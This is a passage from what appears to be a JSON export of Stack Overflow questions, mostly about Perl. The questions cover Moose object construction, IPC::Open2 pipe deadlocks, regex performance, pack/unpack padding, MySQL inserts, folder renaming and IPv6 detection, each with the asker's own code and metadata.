},\n                ],\n            },\n            {\n                id =&gt; 2,\n                name =&gt; 'IT',\n                employees =&gt; [\n                    {\n                        id =&gt; 2,\n                        name =&gt; 'Lucy Jones',\n                        age =&gt; '28',\n                    },\n                    {\n                        id =&gt; 3,\n                        name =&gt; 'Miguel Cerveza',\n                        age =&gt; '25',\n                    },\n                ],\n            },\n        ],\n    }\n);\n</code></pre>\n\n<p>And the Moose classes:</p>\n\n<pre><code>package Company;\nuse Moose;\n\nhas 'id'   =&gt; (is =&gt; 'ro', isa =&gt; 'Num');\nhas 'name' =&gt; (is =&gt; 'ro', isa =&gt; 'Str');\nhas 'departments' =&gt; (is =&gt; 'ro', isa =&gt; 'ArrayRef[Company::Department]');\n1;\n\npackage Company::Department;\nuse Moose;\n\nhas 'id'   =&gt; (is =&gt; 'ro', isa =&gt; 'Num');\nhas 'name' =&gt; (is =&gt; 'ro', isa =&gt; 'Str');\nhas 'employees' =&gt; (is =&gt; 'ro', isa =&gt; 'ArrayRef[Company::Person]');\n1;\n\npackage Company::Person;\nuse Moose;\n\nhas 'id'         =&gt; (is =&gt; 'ro', isa =&gt; 'Num');\nhas 'first_name' =&gt; (is =&gt; 'ro', isa =&gt; 'Str');\nhas 'last_name'  =&gt; (is =&gt; 'ro', isa =&gt; 'Str');\nhas 'age'        =&gt; (is =&gt; 'ro', isa =&gt; 'Num');\n1;\n</code></pre>\n\n<p>Whats the best way to turn this hash into a Company object?</p>\n\n<p>The options I've considered so far are:</p>\n\n<ol>\n<li>Manually loop the %hash, find the deepest \"classes\" (e.g Person), create these first, then manually add these to the newly created higher level classes (Department), and so on.</li>\n<li>Add some kind of coercion functionality to each class, which lets me do something like Company->new(%hash), and make each class create its own \"subclasses\" (via coercion)</li>\n<li>Convert the %hash into a structure similar to what MooseX::Storage would serialize to, then use MooseX::Storage to instatiate everything for me...</li>\n</ol>\n\n<p>Any other ideas or suggestions?</p>\n"},{"tags":["perl","pack","unpack"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":91,"score":-2,"question_id":12520462,"title":"perl quick switch from quaternary to decimal","body":"<p>I'm representing nucleotides A,C,G,T as 0,1,2,3, and afterwards I need to translate the sequence representing as quaternary to decimal. Is there a way to achieve this in perl? I'm not sure if pack/unpack can do this or not. </p>\n"},{"tags":["multithreading","perl"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":41,"score":3,"question_id":12532402,"title":"Piping large files using IPC::open2","body":"<p>I have made a perl script that wraps around another tool (overlapFeatures) so that I can  correctly convert my file formats on the fly. The files I am dealing with are all tab-seperated tables of typically 2 million lines or so. On its own, overlapFeatures has no trouble dealing with these.</p>\n\n<p>However I think I'm causing the pipes to lock up by piping so many lines at once. I know I need to somehow thread this so that I can read and write to the child process at the same time. However I really don't understand how to properly use threads in perl (or any other program for that matter). As I understand it I can use <code>threads</code> or even <code>IPC::run</code> to solve my problem.</p>\n\n<p>My original script that ends up deadlocking goes something like this:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse IPC::Open2;\n\nmy $infile = shift;\nmy $featurefile = shift;\n\nmy $command = 'overlapFeatures';\nmy @args = (qw (-a stdin -b), $featurefile);\n\nmy ($input, $output);\nmy $pid = open2($output, $input, $command, @args) \n    or die \"Failed with error $!\\n\";\n\nopen (my $infh, '&lt;', $infile) or die \"Can't open $infile\\n\";\nwhile (&lt;$infh&gt;){\n    # Do some format conversion...\n    chomp\n    my @cols = split /\\t/;\n    # print a modified line to the tool\n    print $input join (\"\\t\", @cols[0,2,3,1,5,4]),\"\\n\";\n}\nclose ($input);\n\nwhile (&lt;$output&gt;){\n    # format conversion for ouput\n    chomp;\n    my @cols = split /\\t/;\n    print join (\",\",@cols[0,1,2,5,3,8]),\"\\n\";\n}\nclose ($output);\n</code></pre>\n\n<p>I attempted rewriting the script to make use of threads as per <a href=\"http://stackoverflow.com/questions/7284198/how-to-filter-a-lot-of-data-with-ipcopen2\">How to filter a lot of data with IPC::Open2?</a> like so:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse IPC::Open2;\nuse threads;\n\nmy $infile = shift;\nmy $featurefile = shift;\n\nmy $command = 'overlapFeatures';\nmy @args = (qw (-a stdin -b), $featurefile);\n\nmy ($input, $output);\nmy $pid = open2($output, $input, $command, @args) \n    or die \"Failed with error $!\\n\";\n\nmy $thread = async {\n    print join(\",\", qw(seqid start end strand read feature name)),\"\\n\";\n    for(;;) {\n        my $line = &lt;$output&gt;; # should block here and wait for output?\n        last if !defined $line; # end of stream reached?\n        print STDERR \"Got line $line\\n\";\n        # Do some format conversion...\n        chomp $line;\n        my @cols = split /\\t/, $line;\n        # print a modified line to the tool\n        print join(\",\",@cols[0,1,2,5,3,8]),\"\\n\";\n    }\n    close($output)\n};\n\n{\n    open (my $infh, '&lt;', $infile) or die \"Can't open $infile\\n\";\n    while (&lt;$infh&gt;){\n        # format conversion for ouput\n        chomp;\n        my @cols = split /\\t/;\n        print $input join (\"\\t\", @cols[0,2,3,1,5,4]),\"\\n\";\n    }\n    close ($input);\n}\n\n$thread-&gt;join();\nwaitpid ($pid, 0);\n</code></pre>\n\n<p>However, the script still gets stuck in the same way and I am stuck too. I also can't work out how to use <code>IPC::run</code> in this instance.</p>\n\n<p>What am I doing wrong? Have I misunderstood threading?</p>\n\n<hr>\n\n<p>EDIT: Spending more time debugging the script (and help from amon), I found that I am able to retrieve lines from <code>$output</code>. However, the script never finishes and appears to hang after all output is received. I think this is my only issue now.</p>\n"},{"tags":["python","regex","perl","bash","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":140,"score":0,"question_id":12531035,"title":"Fastest way of processing regexp","body":"<p>I have a script in python to process a log file - it parses the values and joins them simply with a <code>tab</code>.</p>\n\n<pre><code>p = re.compile(\n    \"([0-9/]+) ([0-9]+):([0-9]+):([0-9]+) I.*\"+\n    \"worker\\\\(([0-9]+)\\\\)(?:@([^]]*))?.*\\\\[([0-9]+)\\\\] \"+\n    \"=RES= PS:([0-9]+) DW:([0-9]+) RT:([0-9]+) PRT:([0-9]+) IP:([^ ]*) \"+\n    \"JOB:([^!]+)!([0-9]+) CS:([\\\\.0-9]+) CONV:([^ ]*) URL:[^ ]+ KEY:([^/]+)([^ ]*)\"\n  )\n\nfor line in sys.stdin:\n  line = line.strip()\n  if len(line) == 0: continue\n  result = p.match(line)\n      if result != None:\n    print \"\\t\".join([x if x is not None else \".\" for x in result.groups()])\n</code></pre>\n\n<p>However, the scripts behaves quite slowly and it takes a long time to process the data.</p>\n\n<p>How can I achieve the same behaviour in faster way? Perl/SED/PHP/Bash/...?</p>\n\n<p>Thanks</p>\n"},{"tags":["regex","perl","datetime","type-conversion"],"answer_count":3,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":172,"score":1,"question_id":12530938,"title":"What's a Perl regex to convert dates like 'Dec 26 2012 12:00AM' to yyyymmdd?","body":"<p>I've tried pretty hard to find an example of this particular conversion (these date formats) using Perl regex, and to no avail.  Can someone please help me convert dates between these formats?</p>\n\n<pre><code>Dec 26 2012 12:00AM ==&gt;  201212126\n</code></pre>\n\n<p>The following was my initial attempt but it runs too slow (obviously, I used substr like 5 times which is ridiculous).</p>\n\n<pre><code># Format the input time to yyyymmdd from 'Dec 26 2012 12:00AM' like format.\nsub formatTime($)\n{\n    #Get passed in value of format 'Dec 26 2012 12:00AM'.\n    my $col = shift; \n\n    if (substr($col, 4, 1) eq \" \"){\n        substr($col, 4, 1) = \"0\";\n    }\n\n    return substr($col, 7, 4).$months{substr($col, 0, 3)}.substr($col, 4, 2);\n}\n</code></pre>\n\n<p>Note: This is for work, for converting input files to a very large DB ingestion, and unfortunately python is not supported on platform which is my language of choice for scripting.  I tried making my own Perl regex, but I just don't have time to read up and figure it out while doing other parts of this.  I already wasted most of yesterday writing Perl scripts and learning on the fly for the rest of it, this conversion just it taking me too long.</p>\n"},{"tags":["perl","user-agent","mojo","mojolicious"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":51,"score":0,"question_id":12529617,"title":"How to set a custom useragent string in Mojo::UserAgent","body":"<p>We have a bunch of code built around Mojo::UserAgent and migrating to MojoX::UserAgent is not quite an option. I wonder if there is a way to get/set user agent string in Mojo::UserAgent?</p>\n"},{"tags":["mysql","arrays","perl","insert"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":88,"score":2,"question_id":12528913,"title":"How can I insert data from three Perl arrays into a single MySQL table?","body":"<p>I have 3 different arrays in Perl (namely A, B and C). Now, I have a table in mysql which also has 3 fields. </p>\n\n<p>What I am trying to do is get all the contents of array A in first field of mysql table, contents of array B into second field and so on. I tried doing this using foreach loops but it works fine for the first array but does not insert anything for the second and third array. </p>\n\n<p>The code is used is as below:</p>\n\n<pre><code>foreach my $a (@a) {\n\n    my $sql = \"insert into es(a) VALUES(\\\"$a\\\")\";\n    my $sth = $dbh-&gt;prepare($sql);\n    $sth-&gt;execute or die \"SQL Error: $DBI::errstr\\n\";\n}\n\n\nforeach my $b (@b) {\n\n    my $sql = \"insert into es(b) VALUES(\\\"$b\\\")\";\n    my $sth = $dbh-&gt;prepare($sql);\n    $sth-&gt;execute or die \"SQL Error: $DBI::errstr\\n\";\n\n}\n</code></pre>\n\n<p>and similarly for third.\nThe column a of the table gets populated correctly but there is no data for column b and c in the table. What am I doing wrong.</p>\n"},{"tags":["perl","arrays","sorting"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":312,"score":2,"question_id":3382264,"title":"How do you sort parallel arrays in Perl?","body":"<p>I have a few arrays of the same length. I want to sort the first array, and make all the others array \"sort\" accordingly. For example, if the first array is <code>(7,2,9)</code> the second is <code>(\"seven\",\"two\",\"nine\")</code> and the third is <code>(\"VII\",\"II\",\"IX\")</code> after the sort (ascendingly according to the first array values) we will have <code>(2,7,9)</code> <code>(\"two\",\"seven\",\"nine\")</code> and <code>(\"II\",\"VII\",\"IX\")</code>.</p>\n\n<p>How can I do that?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":7,"view_count":119,"score":-5,"question_id":12528241,"title":"Best IDE for Perl 5","body":"<p>I am new with Perl. I have a good experience with bash shell scripting and now moving my steps to Perl.</p>\n\n<p>Please suggest me best IDE for Perl 5.</p>\n\n<p>Is Perl 6 kill Perl 5 or Perl 5 always alive?</p>\n"},{"tags":["perl","bash","freebsd"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":39,"score":0,"question_id":12527823,"title":"How can i dynamically assign filename with -w option in tcpdump.sh on freebsd?","body":"<p>How can i dynamically assign filename with -w option here ?</p>\n\n<p>I am working on freebsd. I want to dynamically assign filename to the file created using -w option in this perl script. I have been using following method but to no avail.</p>\n\n<pre><code>$name = `date`;\nsystem (\"nstcpdump.sh -C 1 -w $name\");\n</code></pre>\n\n<p>Can someone help me with this ?</p>\n"},{"tags":["linux","perl","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":122,"score":2,"question_id":12524104,"title":"Regular expression to check if brackets are nested","body":"<p>I have a large number of files which contain lines with matched braces. I do <em>not</em> care if the brackets are matched or not.</p>\n\n<p>I'd like to check if any braces are nested, by checking which comes first after an opening bracket - a closing or another opening bracket. I assume that all brackets are matched, and that there is at most one outer-bracket per line. (Ie, <code>[foo[bar]]</code> is a valid line, <code>[foo][bar]</code> is not, because the second bracket pair isn't nested).</p>\n\n<p>I can get everything inside a bracket pair from <a href=\"http://stackoverflow.com/questions/905180/how-to-find-text-within-in-sed\">this question</a> using <code>'s/.*\\[\\([^]]*\\)\\].*/\\1/g'</code>, but I'm unsure how to re-test the grabbed string for further matches. </p>\n\n<p>For example, given the following string:</p>\n\n<pre><code>foo [ bar, [baz] ]\n</code></pre>\n\n<p>the steps I think I would take are:</p>\n\n<ol>\n<li>Traverse from the left-hand side until I see an opening bracket. (If none is found, ignore the line). </li>\n<li>Non-greedily search from the opening brace until either <code>[</code> or <code>]</code> is encountered. If <code>[</code>,  brackets are nested, so return the line. If <code>]</code>, </li>\n</ol>\n\n<p>Ideally I'd like a <code>sed</code> or unix-tool based solution, but others are acceptable (<code>perl</code>, for example). Any help would be appreciated. </p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12526807,"title":"how to search and take particular text in perl","body":"<p>I have one folder it contain 'n' number of html files. I'll read the files and take the one line. (i.e) I'll take the <code>&lt;img /&gt;</code> tag in one array and print the array. Now doesn't print the array. Can you help me. My code is here.</p>\n\n<pre><code>use strict;\nuse File::Basename;\nuse File::Path;\nuse File::Copy;\nuse Win32::OLE;\nuse Win32::OLE::Const 'Microsoft Excel';\n\nprint \"Welcome to PERL program\\n\";\n\n#print \"\\n\\tProcessing...\\n\";\nmy $foldername = $ARGV[0];\nopendir(DIR,$foldername) or die(\"Cannot open the input folder for reading\\n\");\nmy (@htmlfiles) = grep/\\.html?$/i, readdir(DIR);\nclosedir(DIR);\n\n\n@htmlfiles = grep!/(?:index|chapdesc|listdesc|listreview|addform|addform_all|pattern)\\.html?$/i,@htmlfiles;\n# print \"HTML file is @htmlfiles\";\n\nmy %fileimages;\nmy $search_for = 'img';\nmy $htmlstr;\nfor my $files (@htmlfiles)\n{\n    if(-e \"$foldername\\\\$files\")\n    {\n        open(HTML, \"$foldername\\\\$files\") or die(\"Cannot open the html files '$files' for reading\");\n        local undef $/;my $htmlstr=&lt;HTML&gt;;\n        close(HTML);\n        $fileimages{uc($2)}=[$1,$files] while($htmlstr =~/&lt;img id=\"([^\"]*)\" src=\"\\.\\/images\\/[^t][^\\/&lt;&gt;]*\\/([^\\.]+\\.jpg)\"/gi);\n\n    }\n}\n</code></pre>\n\n<p>In command prompt.</p>\n\n<blockquote>\n  <p>perl findtext.pl \"C:\\viji\\htmlfiles\"</p>\n</blockquote>\n\n<p>regards, viji</p>\n"},{"tags":["perl","shell"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12515584,"title":"Splitting large file into small multiple files based on the column concatenation","body":"<p>I have an input file as following. I need to break them into multiple files based on the columns 2,3&amp;5. The file has more columns but i have used cut command to get only the required columns.</p>\n\n<pre><code>12,Accounts,India,free,Internal\n13,Finance,China,used,Internal\n16,Finance,China,free,Internal\n12,HR,India,free,External\n19,HR,China,used,Internal\n33,Finance,Japan,free,Internal\n39,Accounts,US,used,External\n14,Accounts,Japan,used,External\n11,Finance,India,used,External\n11,HR,US,used,External\n10,HR,India,used,External\n</code></pre>\n\n<p>Output files:</p>\n\n<pre><code>Accounts_India_Internal --\n12,Accounts,India,free,Internal\n\nFinance_China_Internal --\n13,Finance,China,used,Internal\n16,Finance,China,free,Internal\n\nHR_India_External --\n12,HR,India,free,External\n10,HR,India,used,External\n\nHR_China_Internal --\n19,HR,China,used,Internal\n</code></pre>\n\n<p>and so on..</p>\n\n<p>Please let me know how to achieve this.</p>\n\n<p>As of now, I am thinking to sort the file based on these columns (2,3,5) and then run a loop on each record and start creating files. If a file does not exist, then create and add the record. Otherwise open the old file and add the record.</p>\n\n<p>Is it possible to do this using shell scripting (bash)?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":3,"view_count":79,"score":-1,"question_id":12526686,"title":"What does '$?' this mean in perl","body":"<p>What does below if condition means in perl:</p>\n\n<pre><code>  if($? != 0 ){\n  }\n</code></pre>\n\n<p>please explain.</p>\n"},{"tags":["perl","unix","solaris"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12525728,"title":"variable with multiple lines.delete first two lines in perl","body":"<p>I have a result of an sql query.it returns some 10 rows like below:</p>\n\n<p>if i do the below in my perl script.</p>\n\n<pre><code>print $result\n</code></pre>\n\n<p>it gives me the output :</p>\n\n<pre><code> key       value                            \n ----------- ------------------------------ \n  1428116300 0003000                        \n   560779655 0003001                        \n   173413463 0003002                        \n      315642 0003003                        \n  1164414857 0003004                        \n   429589116 0003005 \n</code></pre>\n\n<p>i just want to acheive that the first two lines to be deleted. and store the rest of each line in an array.\ncould any body please tell how do i achive this?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12525353,"title":"how to modify folders name","body":"<p>I have a bunch of folder in my local hard disk. Below is the folders name : </p>\n\n<pre><code>3 ABC\nabc movie (2002)  HDTVRip  576p  Hindi  Eng  BHATTI87\nBcd [2011].720p.BRRip.x264.[Dual Audio] [Hindi+English].by K@rtik [ExD Exclusive]\ndef (2007)\nGaf-DVDRip-AVI\nGadks Of Wc (2012) - DVDRip - 1CD - XviD - Subs - [xDM]\nKah - DVDScr - XviD - 1CDRip - [DDR]\nkaslf.kasl .Ljasj [2007] - x264 - AAC - 1 CD DVDRip - ESubs - MDG\n</code></pre>\n\n<p>I want all the name have some similarity like between each string there should be one space i.e  \"Gadks Of Wc (2012) - DVDRip - 1CD - XviD - Subs - [xDM]\" should be<br>\nGadks Of Wc (2012) DVDRip 1CD XviD Subs [xDM]. </p>\n\n<p>My logic was : </p>\n\n<ol>\n<li>Read the each folder name</li>\n<li>Store all the folder name in a list </li>\n<li>Do operation like split and join on  each name </li>\n</ol>\n\n<p>Below is my script : </p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\n\nmy $dir_name = \"E:/movie\";\n\nopendir READ, $dir_name\n    or die\"Can not found it $!\";\n\nmy @name = readdir(READ);\nmy (@split_name, $update_movie_name, $fix_movie_name);\n\nforeach my $name (@name) {\n\n   @split_name        = split /[\\s+\\/.\\-]/,$name;\n   $update_movie_name = movie_fun(@split_name); \n}\n\nsub movie_fun {\n\n    foreach my $movie (@split_name) {\n\n        $fix_movie_name = join(\"\",$movie);\n    }\n\n    return ($fix_movie_name);\n}  \n</code></pre>\n\n<p>With this script I am only getting last part of the folder name. I don't know where am I doing mistake. Please help me out of this problem. So that i can move my next step which will be deleting junk part from the name i.e \"(2012) - DVDRip - 1CD - XviD - Subs - [xDM]\",(2007) etc</p>\n\n<p>If any body  can give me any other way to proceed for this problem then also will be fine. </p>\n\n<p>Thanks</p>\n\n<p>Thanks</p>\n"},{"tags":["perl","hex","pack"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":81,"score":3,"question_id":12497243,"title":"How to make pack to fill data with zeroes from the beginning?","body":"<p>I'm using <a href=\"http://perldoc.perl.org/functions/pack.html\" rel=\"nofollow\"><code>pack / unpack</code></a> in perl to convert hex values to decimal like this:</p>\n\n<pre><code>print unpack \"S\", reverse pack \"H4\", \"1230\";\n&gt; 4656\n</code></pre>\n\n<p>Everything is good while data is 4 hex symbols.\nIf data length is not enough to fit requested format pack adds zeroes to the end. </p>\n\n<p>Like this:</p>\n\n<pre><code>print unpack \"b*\", pack \"H4\", \"FF\";\n&gt; 1111111100000000\n</code></pre>\n\n<p>It causes:</p>\n\n<pre><code>print unpack \"S\", reverse pack \"H4\", \"123\";\n&gt; 4656\n</code></pre>\n\n<p>While I'd like it to be the same as <a href=\"http://perldoc.perl.org/functions/oct.html\" rel=\"nofollow\"><code>oct</code></a>:</p>\n\n<pre><code>print oct(\"0x123\");\n&gt; 291\n\nprint unpack \"S\", reverse pack \"H4\", \"0123\";\n&gt; 291\n</code></pre>\n\n<p><strong>How to make pack to add zeroes at the beginning of the data when data length not enough to fit format?</strong></p>\n\n<h2>Short FAQ</h2>\n\n<p><strong>What are you trying to do?</strong>\nI have bunch of functions to deal with different types of data (<code>float</code>, <code>short</code>, <code>long</code>, <code>ushort</code>, <code>ulong</code>, etc). All conversions are done in using <code>pack</code>/<code>unpack</code>. These functions are needed to convert data produced by third-party.</p>\n\n<p><strong>Why not to use <code>oct</code> or <code>hex</code>?</strong>\nBecause I have to deal with signed integer and float. And I want all functions to be similar for better code understanding.</p>\n\n<p><strong>Could you provide more examples?</strong> Here they are:</p>\n\n<p><strong>Example 1:</strong> Signed short integer (full data received). System receives hex data <code>018F</code> from third party. This data supposed to be <code>signed short</code>, so it is processed in the following way:</p>\n\n<pre><code>print unpack \"s\", reverse pack \"H4\", \"018F\";\n&gt; 399\n</code></pre>\n\n<p><strong>Example 2:</strong> Signed short integer (half data received). System receives hex data <code>8F</code> from third party. <code>8F</code> is only 1 byte, while 2 bytes needed to form short integer. It is processed in the same way:</p>\n\n<pre><code>print unpack \"s\", reverse pack \"H4\", \"8F\";\n&gt; -28928\n</code></pre>\n\n<p>But third party means <code>008F</code> not <code>8F00</code>:</p>\n\n<pre><code>print unpack \"s\", reverse pack \"H4\", \"008F\";\n&gt; 143\n\nprint unpack \"s\", reverse pack \"H4\", \"8F00\";\n&gt; -28928\n</code></pre>\n\n<p><strong>What about endianness?</strong>\nIn all examples received data is <code>big-endian</code>, while my system is <code>little-endian</code> that is why <code>reverse</code> used.</p>\n\n<p><strong>How do you deal with it now?</strong> I'm using sprintf to add zeroes.</p>\n\n<pre><code>print unpack \"s\", reverse pack \"H4\", sprintf \"%04s\", \"8F\";\n&gt; 143\n</code></pre>\n\n<p><strong>What version of perl do you use?</strong> 5.8.8</p>\n"},{"tags":["perl","import","insert","eval","hack"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12523395,"title":"Eval insert html into perl cgi-script of running code?","body":"<pre><code>#!/usr/bin/perl\n\nopen FILE, '&lt;', 'evfile';\n@file = &lt;FILE&gt;;\n\n$char1 = \"123456\";\n$char2 = \"holy cow\";\n</code></pre>\n\n<p>I want code of FILE to pop out here and display the variables </p>\n\n<pre><code> $char1 and $char2\n</code></pre>\n\n<p>I've tried the following </p>\n\n<pre><code>#1\n{eval @file;}\n\n#2\n{print (eval @file);}\n#3\n{for(@file){\nprint (eval $_;);\n}\n}\n</code></pre>\n\n<p>I've tried two different things for FILE\nmaking the file a perlscript with a print statement and just a HTML file</p>\n\n<h3>A</h3>\n\n<pre><code>#!/usr/bin/perl\nprint BBBBXM\n&lt;html&gt;\n &lt;head&gt; \n &lt;title&gt;A Simple Perl CGI&lt;/title&gt;\n &lt;/head&gt;\n &lt;body&gt;\n &lt;h1&gt;A Simple Perl CGI&lt;/h1&gt;  \n\n\n &lt;p&gt;$char1   &lt;/p&gt;\n &lt;p&gt; $char2 &lt;/p&gt; \n&lt;/body&gt;\n &lt;/html&gt;\nBBBBXM \n</code></pre>\n\n<h3>B</h3>\n\n<pre><code>html&gt;\n head&gt; \n title&gt;A Simple Perl CGI&lt;/title&gt;\n /head&gt;\n body&gt;\n h1&gt;A Simple Perl CGI&lt;/h1&gt;  \n\n\n p&gt;$char1   &lt;/p&gt;\n p&gt; $char2 &lt;/p&gt; \n/body&gt;\n /html&gt;\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12523128,"title":"Perl Regular Expression String Replacement","body":"<p>I am trying to replace all occurrences of ANY value between two single quotes, including escaped single quotes. The following works quite well, except when an escaped single quote is found. This makes sense, but is there a way around it. I want to replace ALL characters between single quotes.</p>\n\n<pre><code>$ echo \"'blah\\'blah'\" | perl -pe s/\"'\"[^\"'\"]*\"'\"/stuff/g\nstuffblah'\n</code></pre>\n\n<p>I would like to just see:</p>\n\n<pre><code>stuff\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":48,"score":-1,"question_id":12523271,"title":"Perl regular expressions","body":"<p>I'm reading some code that involves regular expression and having some trouble.</p>\n\n<p>Can someone please explain it and give an example of text it would parse?</p>\n\n<pre><code>if(/\\|\\s*STUFF(\\d+)\\s*\\|\\s*STUFF(\\d+)/) \n{\n        $a = $1;\n        $b = $2;\n}\n</code></pre>\n"},{"tags":["perl","encryption","ssis"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":135,"score":0,"question_id":4264401,"title":"Perl encryption algorithm and SSIS data migration","body":"<p>I need to use SSIS to migrate data that have been encrypted using Perl. Here is the Perl decrypt method. I believe this uses bit shifting XOR operation? My Perl is not strong.  How would one go about converting the decrypt method below to something that is useful in an SSIS package? The data in a table column have been encrypted and needs to be decrypted during data migration. Any advice would be much appreciated. </p>\n\n<pre><code>sub Decrypt\n{\n  my $s = shift;\n  my @nonullarray = unpack (\"C*\", $s);  \n\n  my $count;\n  my @arr;\n  for ( $count = 0; $count &lt; scalar @nonullarray; $count ++ ){\n    if ( $nonullarray[$count] == 1 ) {\n      if ( $nonullarray[++$count] == 2 ) {\n        push @arr, 0;\n      } else {\n        push @arr, 1;\n      }\n    } else {\n      push @arr, $nonullarray[$count];\n    }\n  }\n\n  for ( $count = scalar @arr -1; $count &gt; 0; $count -- ){\n    $arr[$count] = ($arr[$count-1] ^ ($arr[$count])) - 1;\n  }\n  $arr[0] = $arr[0]-1;\n\n  return pack ( 'C*', @arr );\n}\n</code></pre>\n"},{"tags":["perl","command-line","cmd"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":8,"view_count":104,"score":-6,"question_id":12492752,"title":"What is the point of the \"perl\" command?","body":"<p>When I type <code>perl</code> in any command prompt (with Perl installed on the system of course) nothing really happens. What is the point of using <code>perl</code> at the command prompt? Unlike the <code>python</code>, <code>lua</code>, and <code>ruby</code> commands it seems to do nothing.</p>\n\n<p>If it does do something, what is it and how do you use it?</p>\n"},{"tags":["regex","string","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12522906,"title":"Perl regex search and replace with $variable->function(\"args\")","body":"<p>Basically I'm trying to replace with whatever is returned from a function call from an object. But I need a return value from the regex search as the argument. It's a little tricky but the code should speak for itself:</p>\n\n<pre><code>while ( $token =~ s/\\$P\\(([a-z0-9A-Z_]+)\\)/$db-&gt;getValue(\"params\", qw($1))/e ) { }\n</code></pre>\n\n<p>The error I'm getting is that $1 is not getting evaluated to anything (the argument literally becomes \"$1\") so it screws up my getValue() method. </p>\n\n<p>Cheers</p>\n"},{"tags":["xml","perl","xml-simple"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":258,"score":3,"question_id":4236947,"title":"XML::Simple ignoring emdash tag?","body":"<p>I'm using XML Simple to parse an XML file, the problematic part looks like that:</p>\n\n<pre><code>    &lt;textBody&gt;\n        &lt;title&gt;\n            &lt;titlePart&gt;\n                &lt;text&gt;SECTION A &lt;emdash/&gt; HUMAN NECESSITIES&lt;/text&gt;\n            &lt;/titlePart&gt;\n        &lt;/title&gt;\n    &lt;/textBody&gt;\n    &lt;ipcEntry kind=\"t\" symbol=\"A01\" ipcLevel=\"C\" entryType=\"K\" lang=\"EN\"&gt;\n        &lt;textBody&gt;\n            &lt;title&gt;\n                &lt;titlePart&gt;\n                    &lt;text&gt;AGRICULTURE&lt;/text&gt;\n                &lt;/titlePart&gt;\n            &lt;/title&gt;\n        &lt;/textBody&gt;\n    &lt;/ipcEntry\n</code></pre>\n\n<p>for some reason XML::Simple completely ignores <code>&lt;text&gt;SECTION A &lt;emdash/&gt; HUMAN NECESSITIES&lt;/text&gt;</code>\nI guess its because the emdash tag, because <code>&lt;text&gt;AGRICULTURE&lt;/text&gt;</code> is parsed just fine.\nI also tried setting the parser by: </p>\n\n<pre><code>$XML::Simple::PREFERRED_PARSER = 'XML::Parser';\n</code></pre>\n\n<p>still no go.\nAny idea?</p>\n"},{"tags":["perl","ipv6"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":62,"score":2,"question_id":12430172,"title":"How to detect if system supports ipv6?","body":"<p>I finally managed to fix ipv6 support in my software. Unfortunately, now it crashes on every ipv4 only machine. Here is the faulty subroutine:</p>\n\n<pre><code>sub init\n{\n    my ($self, %opts) = @_;\n\n    # server options defaults\n    my %defaults = (StartBackground =&gt; 0, ServerPort =&gt; 3000);\n\n    # set options or use defaults\n    map { $self-&gt;{$_} = (exists $opts{$_} ? $opts{$_} : $defaults{$_}) }\n        keys %defaults;\n\n    $self-&gt;{'server'} = HTTP::AppServer::Base-&gt;new($self-&gt;{'ServerPort'}, Socket::AF_INET6);\n\n    return $self;\n}\n</code></pre>\n\n<p>The problem here is in the second last line:</p>\n\n<pre><code>$self-&gt;{'server'} = HTTP::AppServer::Base-&gt;new($self-&gt;{'ServerPort'}, Socket::AF_INET6);\n</code></pre>\n\n<p>As on ipv4 only machine it dies complaining about a not supported address family (which is the second parameter passed to the <code>new</code> function).</p>\n\n<p>Basically, what I need to do is:</p>\n\n<pre><code>if (it_supports_ipv6()) {\n    $self-&gt;{'server'} = HTTP::AppServer::Base-&gt;new($self-&gt;{'ServerPort'}, Socket::AF_INET6);\n}\nelse {\n    $self-&gt;{'server'} = HTTP::AppServer::Base-&gt;new($self-&gt;{'ServerPort'});\n}\n</code></pre>\n\n<p>But how to implement a function like <code>it_supports_ipv6()</code>?</p>\n\n<p>I tried with <code>eval</code> with the following syntax, but it doesn't work:</p>\n\n<pre><code>my $ipv6_success = eval { $self-&gt;{'server'} = HTTP::AppServer::Base-&gt;new($self-&gt;{'ServerPort'}, Socket::AF_INET6); };\nif (!defined($ipv6_success)) {\n    $self-&gt;{'server'} = HTTP::AppServer::Base-&gt;new($self-&gt;{'ServerPort'});\n}\n</code></pre>\n\n<p>The logic is that I've read in <code>eval</code> doc that it returns <code>undef</code> if the expression causes the program to die.</p>\n\n<p>I'm working on a Linux 